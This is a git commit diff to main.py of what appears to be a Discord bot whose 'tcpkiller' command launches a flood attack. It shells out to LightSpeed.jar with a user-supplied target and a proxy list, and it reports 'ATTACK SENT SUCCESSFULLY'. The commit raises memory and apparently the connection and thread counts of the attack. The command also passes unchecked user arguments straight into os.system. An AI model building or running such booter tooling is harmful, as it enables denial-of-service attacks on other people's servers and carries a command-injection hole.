22d73d7ff2c62318fe90e8f33a7ac3c73bbca1b8
hakanerensen112 <94652683+hakanerensen112@users.noreply.github.com>
2023-10-25 20:30:40 +0300

    Update main.py

--- main.py
+++ main.py
@@ -307,7 +307,7 @@ async def tcpkiller(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LightSpeed.jar {arg1} 1000 proxies.txt 2 {arg2} 60 100 800 10")
+            os.system(f"java -Xms6200M -Xmx6200M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LightSpeed.jar {arg1} 10000 proxies.txt 5 {arg2} 60 10000 10000 0")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)
